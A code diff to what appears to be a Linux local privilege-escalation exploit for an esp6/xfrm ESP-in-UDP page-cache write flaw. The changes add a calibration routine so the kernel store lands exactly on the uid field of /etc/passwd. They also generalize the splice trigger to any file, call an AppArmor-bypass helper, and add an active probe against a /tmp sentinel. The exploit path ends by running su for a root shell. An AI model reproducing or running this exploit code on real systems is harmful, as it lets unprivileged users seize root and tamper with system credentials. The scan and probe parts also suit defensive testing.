@@ -107,9 +107,17 @@ df_result_t dirtyfrag_esp6_detect(void)
         return DF_PRECOND_FAIL;
     }
 
+    if (dirtyfail_active_probes) {
+        log_step("--active set: firing v6 ESP-in-UDP trigger against /tmp sentinel");
+        df_result_t pr = dirtyfrag_esp6_active_probe();
+        if (pr == DF_VULNERABLE || pr == DF_OK || pr == DF_PRECOND_FAIL) return pr;
+        log_warn("active probe inconclusive — falling back to precondition verdict");
+    }
+
     log_warn("VULNERABLE (preconditions met) — v6 xfrm SA registration available");
     log_warn("Apply mainline patch f4c50a4034e6 (covers both v4 and v6)");
     log_warn("Some distro backports may have shipped v4-only — test both paths");
+    log_hint("re-run with `--scan --active` for an empirical sentinel-STORE probe");
     return DF_VULNERABLE;
 }
 
@@ -260,7 +268,13 @@ static bool bring_lo_up_v6(void)
     return rc == 0;
 }
 
-static bool trigger_store_v6(off_t passwd_off)
+/* Generalized v6 trigger: splice from `target_path` at `splice_off`,
+ * len 16 bytes. The STORE lands at file_offset (splice_off + shift)
+ * where `shift` is empirically determined per-kernel (see
+ * calibrate_v6_shift below). Use this directly if you already know
+ * the shift; for the production exploit path, callers go through
+ * trigger_store_v6() which compensates automatically. */
+static bool trigger_store_v6_at(const char *target_path, loff_t splice_off)
 {
     int udp_recv = socket(AF_INET6, SOCK_DGRAM, 0);
     if (udp_recv < 0) return false;
@@ -298,9 +312,9 @@ static bool trigger_store_v6(off_t passwd_off)
     /* v6 padding to clear the size gate. */
     unsigned char pad[V6_PAD_BYTES] = {0};
 
-    int pfd = open("/etc/passwd", O_RDONLY);
+    int pfd = open(target_path, O_RDONLY);
     if (pfd < 0) {
-        log_bad("open /etc/passwd: %s", strerror(errno));
+        log_bad("open %s: %s", target_path, strerror(errno));
         close(udp_recv); close(udp_send); return false;
     }
 
@@ -310,23 +324,16 @@ static bool trigger_store_v6(off_t passwd_off)
         close(pfd); close(udp_recv); close(udp_send); return false;
     }
 
-    /* Compose: hdr(24) || passwd@off(16) || pad(V6_PAD_BYTES) */
+    /* Compose: hdr(24) || target@off(16) || pad(V6_PAD_BYTES) */
     struct iovec iov_hdr = { .iov_base = wire_hdr, .iov_len = sizeof(wire_hdr) };
     if (vmsplice(p[1], &iov_hdr, 1, 0) != (ssize_t)sizeof(wire_hdr)) {
         log_bad("vmsplice hdr: %s", strerror(errno));
         goto fail;
     }
     {
-        /* Compensate for the empirical +9 STORE-offset shift in v6 by
-         * splicing from passwd_off - V6_STORE_SHIFT. The 16-byte splice
-         * still lives entirely on the same page-cache page (page 0 of
-         * /etc/passwd), so the kernel's frag points at the correct page;
-         * the STORE then lands at the intended file offset (uid_off). */
-        loff_t off = (passwd_off >= V6_STORE_SHIFT)
-                     ? passwd_off - V6_STORE_SHIFT
-                     : 0;
+        loff_t off = splice_off;
         if (splice(pfd, &off, p[1], NULL, 16, SPLICE_F_MOVE) != 16) {
-            log_bad("splice passwd: %s", strerror(errno));
+            log_bad("splice file->pipe: %s", strerror(errno));
             goto fail;
         }
     }
@@ -358,6 +365,90 @@ fail:
     close(p[0]); close(p[1]);
     close(pfd); close(udp_recv); close(udp_send);
     return false;
+}
+
+/* Calibrate V6_STORE_SHIFT empirically against a sentinel file in /tmp.
+ *
+ * We fire the v6 trigger once with marker bytes "0000" spliced from
+ * sentinel offset 0, then re-read the sentinel and find where "0000"
+ * landed. The offset is the kernel's STORE shift for this build of
+ * esp6_input. Caller then splices from `uid_off - shift` for the real
+ * exploit so the STORE lands exactly at uid_off.
+ *
+ * Returns shift in [0, 64) on success, or -1 if the marker didn't land
+ * at all (kernel may be patched, or trigger setup failed). */
+static int calibrate_v6_shift(void)
+{
+    /* Build a 4 KiB sentinel filled with a recognizable pattern that
+     * cannot collide with our marker "0000". We use ASCII 'A' bytes. */
+    char tmpl[] = "/tmp/dirtyfail-v6-cal.XXXXXX";
+    int sfd = mkstemp(tmpl);
+    if (sfd < 0) { log_bad("calibration: mkstemp: %s", strerror(errno)); return -1; }
+    unsigned char filler[4096];
+    memset(filler, 'A', sizeof(filler));
+    if (write(sfd, filler, sizeof(filler)) != (ssize_t)sizeof(filler)) {
+        close(sfd); unlink(tmpl); return -1;
+    }
+    close(sfd);
+
+    /* Fault the page in. */
+    int rfd = open(tmpl, O_RDONLY);
+    if (rfd < 0) { unlink(tmpl); return -1; }
+    char tmp[4096];
+    if (read(rfd, tmp, sizeof(tmp)) != (ssize_t)sizeof(tmp)) {
+        close(rfd); unlink(tmpl); return -1;
+    }
+    close(rfd);
+
+    /* Fire the trigger from sentinel offset 0. The trigger's wire
+     * packet carries seq_hi="0000" (MARKER), so the STORE writes those
+     * 4 bytes somewhere in the sentinel page. */
+    bool ok = trigger_store_v6_at(tmpl, 0);
+    if (!ok) {
+        log_bad("calibration: v6 trigger failed");
+        unlink(tmpl);
+        return -1;
+    }
+
+    /* Re-read the sentinel via a fresh fd (page-cache view, not disk). */
+    rfd = open(tmpl, O_RDONLY);
+    if (rfd < 0) { unlink(tmpl); return -1; }
+    unsigned char after[64];
+    ssize_t got = read(rfd, after, sizeof(after));
+    close(rfd);
+    unlink(tmpl);
+    if (got <= 0) return -1;
+
+    /* Search the first 64 bytes for the marker. We expect it to land
+     * within ~32 bytes of offset 0 based on prior empirical tests. */
+    for (int i = 0; i + 4 <= got; i++) {
+        if (memcmp(after + i, MARKER, 4) == 0) {
+            log_ok("v6 calibration: STORE landed at sentinel offset %d", i);
+            return i;
+        }
+    }
+    log_warn("v6 calibration: marker '%s' did not land in sentinel — "
+             "kernel may be patched, or trigger didn't fire", MARKER);
+    return -1;
+}
+
+/* Production v6 trigger: calibrates the shift on first call, then
+ * splices from passwd_off - shift so the STORE lands at passwd_off. */
+static int g_v6_shift = -1;   /* lazy-init by trigger_store_v6 */
+
+static bool trigger_store_v6(off_t passwd_off)
+{
+    if (g_v6_shift < 0) {
+        g_v6_shift = calibrate_v6_shift();
+        if (g_v6_shift < 0) {
+            log_warn("v6 calibration failed; falling back to hard-coded "
+                     "V6_STORE_SHIFT=%d (may be wrong for this kernel)",
+                     V6_STORE_SHIFT);
+            g_v6_shift = V6_STORE_SHIFT;
+        }
+    }
+    loff_t off = (passwd_off >= g_v6_shift) ? passwd_off - g_v6_shift : 0;
+    return trigger_store_v6_at("/etc/passwd", off);
 }
 
 static int run_v6_in_userns(off_t passwd_off, uid_t real_uid, gid_t real_gid)
@@ -507,4 +598,98 @@ df_result_t dirtyfrag_esp6_exploit(bool do_shell)
     execlp("su", "su", user, (char *)NULL);
     log_bad("execlp: %s", strerror(errno));
     return DF_EXPLOIT_FAIL;
+}
+
+/* ---------------------------------------------------------------- *
+ * Active probe — used by `--scan --active`.
+ *
+ * Same shape as the v4 active probe: registers an SA in a fresh
+ * userns and fires the trigger against a sentinel /tmp file. The
+ * parent re-reads the sentinel and looks for the marker.
+ * ---------------------------------------------------------------- */
+
+df_result_t dirtyfrag_esp6_active_probe_inner(void)
+{
+#ifdef __linux__
+    const char *sentinel = getenv("DIRTYFAIL_PROBE_SENTINEL");
+    if (!sentinel || !*sentinel) {
+        log_bad("active-probe v6: DIRTYFAIL_PROBE_SENTINEL not set");
+        return DF_TEST_ERROR;
+    }
+    if (!bring_lo_up_v6()) {
+        log_bad("active-probe v6: bring lo up: %s", strerror(errno));
+        return DF_TEST_ERROR;
+    }
+    int nl = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
+    if (nl < 0) {
+        log_bad("active-probe v6: netlink xfrm: %s", strerror(errno));
+        return DF_TEST_ERROR;
+    }
+    struct sockaddr_nl nla = { .nl_family = AF_NETLINK };
+    if (bind(nl, (struct sockaddr *)&nla, sizeof(nla)) < 0) {
+        log_bad("active-probe v6: bind netlink: %s", strerror(errno));
+        close(nl); return DF_TEST_ERROR;
+    }
+    if (!xfrm6_register_sa(nl, (const unsigned char *)MARKER)) {
+        close(nl); return DF_TEST_ERROR;
+    }
+    /* Splice from sentinel offset 0; we don't need uid_off math here. */
+    if (!trigger_store_v6_at(sentinel, 0)) {
+        close(nl); return DF_TEST_ERROR;
+    }
+    close(nl);
+    return DF_EXPLOIT_OK;
+#else
+    return DF_TEST_ERROR;
+#endif
+}
+
+df_result_t dirtyfrag_esp6_active_probe(void)
+{
+    char tmpl[] = "/tmp/dirtyfail-esp6-probe.XXXXXX";
+    int sfd = mkstemp(tmpl);
+    if (sfd < 0) { log_bad("probe v6 mkstemp: %s", strerror(errno)); return DF_TEST_ERROR; }
+    unsigned char filler[4096];
+    memset(filler, 'A', sizeof(filler));
+    if (write(sfd, filler, sizeof(filler)) != (ssize_t)sizeof(filler)) {
+        close(sfd); unlink(tmpl); return DF_TEST_ERROR;
+    }
+    close(sfd);
+
+    int rfd = open(tmpl, O_RDONLY);
+    if (rfd < 0) { unlink(tmpl); return DF_TEST_ERROR; }
+    char tmp[4096];
+    if (read(rfd, tmp, sizeof(tmp)) != (ssize_t)sizeof(tmp)) {
+        close(rfd); unlink(tmpl); return DF_TEST_ERROR;
+    }
+    close(rfd);
+
+    setenv("DIRTYFAIL_INNER_MODE",     "esp6-probe", 1);
+    setenv("DIRTYFAIL_PROBE_SENTINEL", tmpl,         1);
+    int rc = apparmor_bypass_fork_arm(0, NULL);
+    unsetenv("DIRTYFAIL_INNER_MODE");
+    unsetenv("DIRTYFAIL_PROBE_SENTINEL");
+
+    if (rc == DF_PRECOND_FAIL) { unlink(tmpl); return DF_PRECOND_FAIL; }
+    if (rc != DF_EXPLOIT_OK)   {
+        log_bad("active-probe v6 inner failed (exit=%d)", rc);
+        unlink(tmpl); return DF_TEST_ERROR;
+    }
+
+    rfd = open(tmpl, O_RDONLY);
+    if (rfd < 0) { unlink(tmpl); return DF_TEST_ERROR; }
+    unsigned char after[64];
+    ssize_t got = read(rfd, after, sizeof(after));
+    close(rfd);
+    unlink(tmpl);
+    if (got <= 0) return DF_TEST_ERROR;
+
+    for (int i = 0; i + 4 <= got; i++) {
+        if (memcmp(after + i, MARKER, 4) == 0) {
+            log_warn("ACTIVE PROBE v6: STORE landed at offset %d → kernel is VULNERABLE", i);
+            return DF_VULNERABLE;
+        }
+    }
+    log_ok("ACTIVE PROBE v6: page intact — kernel esp6 path appears patched");
+    return DF_OK;
 }
